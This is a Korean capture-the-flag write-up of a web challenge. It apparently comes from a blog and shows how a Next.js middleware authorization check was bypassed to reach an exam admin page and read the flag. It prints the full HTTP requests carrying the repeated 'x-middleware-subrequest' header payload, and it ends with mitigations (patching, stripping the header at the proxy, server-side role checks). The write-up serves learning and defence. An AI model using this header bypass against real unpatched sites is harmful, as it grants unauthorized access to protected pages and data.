---
title: '[K.knock × D-Alpha × CAUtion CTF] 답지유출 | Web Write-up'
date: 2026-07-26T00:00:00.000Z
recordOrder: 7
categories:
  - CTF/Wargame
tags:
  - HSPACE
  - 연합 CTF
  - Web
  - Write-up
description: Next.js middleware 우회를 통한 권한 검사 회피
---
안녕하세요. somani입니다!

이번에는 Next.js 미들웨어의 권한 검사를 우회해 답안 페이지에 접근한 과정을 정리해 보려고 합니다.

## 답지유출

### 1. 문제 개요

시험 관리 시스템에 접속하면 시험 일정과 공지사항을 확인할 수 있습니다.

상단 메뉴에는 답안 조회 기능이 존재하지만, 일반 사용자가 접근하면 다음과 같은 메시지가 출력됩니다.

접근 권한이 없습니다. 답안 조회는 교수 계정으로만 가능합니다.

관리자 또는 교수 권한을 획득하여 답안 페이지에 접근하고, 숨겨진 플래그를 확인하는 것이 문제의 목표입니다.

### 2. 초기 분석

문제 서버는 다음 주소에서 동작하고 있었습니다.

```text
http://15.164.79.100:11013
```

```text
답안 조회 메뉴를 클릭한 뒤 Burp Suite의 Proxy → HTTP history를 확인하였다.
```

다음과 같은 요청이 발생했습니다.

```http
GET /admin?_rsc=1wtp7 HTTP/1.1
Host: 15.164.79.100:11013
```

서버의 응답은 다음과 같았습니다.

```http
HTTP/1.1 307 Temporary Redirect
Location: /?error=unauthorized
```

즉, /admin 경로에 접근하면 서버가 권한을 검사한 뒤, 권한이 없는 사용자를 메인 페이지로 리다이렉트하고 있었습니다.

또한 응답과 요청 헤더에서 다음과 같은 특징을 확인할 수 있었습니다.

```text
RSC
Next-Router-State-Tree
Next-Router-Prefetch
x-nextjs-cache
```

이를 통해 해당 웹 애플리케이션이 Next.js 기반으로 동작한다는 것을 알 수 있었습니다.

### 3. 취약점 분석

Next.js는 특정 경로에 대한 인증과 접근 제어를 middleware에서 처리할 수 있습니다.

이 문제에서는 /admin 경로에 접근할 때 미들웨어가 사용자의 교수 권한을 검사하는 것으로 보였습니다.

Next.js 내부에서는 미들웨어가 다른 미들웨어를 재귀적으로 호출하는 상황을 방지하기 위해 다음 헤더를 사용합니다.

x-middleware-subrequest

일부 취약한 Next.js 버전에서는 공격자가 이 헤더를 직접 설정하고, 미들웨어 이름을 여러 번 반복하면 해당 요청이 이미 미들웨어 내부에서 처리된 요청이라고 잘못 판단합니다.

그 결과 실제 인증 미들웨어가 실행되지 않고 보호된 페이지에 접근할 수 있습니다.

### 4. 권한 우회 시도

Burp Suite에서 /admin 요청을 Repeater로 전송했습니다.

처음에는 다음과 같이 헤더 값을 한 번만 설정했습니다.

```http
GET /admin HTTP/1.1
Host: 15.164.79.100:11013
Accept: text/html
x-middleware-subrequest: middleware
Connection: close
```

하지만 서버는 여전히 다음 응답을 반환했습니다.

```http
HTTP/1.1 307 Temporary Redirect
Location: /?error=unauthorized
```

따라서 middleware 문자열을 여러 번 반복하여 요청했습니다.

```http
GET /admin HTTP/1.1
Host: 15.164.79.100:11013
Accept: text/html
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
Connection: close
```

이번에는 서버가 리다이렉트하지 않고 다음과 같이 응답했습니다.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

응답 HTML에서 관리자 전용 페이지가 노출됐습니다.

```text
<h1>시험 관리</h1>
```

```python
<nav class="admin-nav">
  <a href="/admin/schedule">일정 관리</a>
  <a href="/admin/students">학생 목록</a>
  <a href="/admin/answers">답지 열람</a>
</nav>
```

이를 통해 미들웨어 권한 검사가 정상적으로 우회된 것을 확인했습니다.

### 5. 답지 페이지 접근

관리자 페이지에서 답지 경로가 다음과 같이 노출되어 있었습니다.

```text
/admin/answers
```

따라서 동일한 우회 헤더를 유지한 채 요청 경로만 변경했습니다.

```http
GET /admin/answers HTTP/1.1
Host: 15.164.79.100:11013
Accept: text/html
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
Connection: close
```

서버는 다시 200 OK를 반환했습니다.

응답 HTML에는 기말고사 답지와 함께 플래그가 포함되어 있었습니다.

```python
<li>
  서술형: 다음 플래그를 작성하시오.
  <br/>
  <span class="flag-answer">
    CTF{n3xt_m1ddl3w4r3_byp4ss_g00dby3_F}
  </span>
</li>
```

### 6. 최종 플래그

```text
CTF{n3xt_m1ddl3w4r3_byp4ss_g00dby3_F}
```

### 7. 취약점 원인

이 문제의 핵심 원인은 클라이언트가 임의로 설정할 수 있는 다음 헤더를 Next.js가 신뢰한 것입니다.

x-middleware-subrequest

공격자가 미들웨어 이름을 반복하여 전달하면 서버가 해당 요청을 내부 서브리퀘스트로 잘못 판단했습니다.

```text
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

그 결과 교수 권한을 확인하는 인증 미들웨어가 실행되지 않았고, 인증되지 않은 일반 사용자도 /admin과 /admin/answers에 접근할 수 있었습니다.

### 8. 공격 흐름 정리

```text
1. 답안 조회 메뉴 접근
2. /admin 요청에서 307 리다이렉트 확인
3. Next.js 관련 헤더를 통해 프레임워크 식별
4. x-middleware-subrequest 헤더 삽입
5. middleware 문자열을 5회 반복
6. 인증 미들웨어 우회
7. /admin 페이지 접근
8. /admin/answers 경로 발견
9. 답지 페이지에서 플래그 획득
```

### 9. 대응 방안

가장 우선적인 대응은 취약점이 수정된 Next.js 버전으로 업데이트하는 것입니다.

또한 외부 클라이언트가 보낸 x-middleware-subrequest 헤더를 리버스 프록시에서 제거해야 합니다.

예를 들어 Nginx를 사용하는 경우 외부 요청의 해당 헤더를 신뢰하지 않도록 설정할 수 있습니다.

```text
proxy_set_header x-middleware-subrequest "";
```

중요한 관리자 기능은 미들웨어 검사에만 의존하지 않고, 실제 페이지 또는 API 내부에서도 서버 측 권한 검사를 다시 수행해야 합니다.

```python
if (!session || session.role !== "professor") {
  return new Response("Forbidden", { status: 403 });
}
```

즉, 미들웨어가 우회되더라도 관리자 데이터가 반환되지 않도록 다중 권한 검증을 적용해야 합니다.

읽어주셔서 감사합니다. (꾸벅)
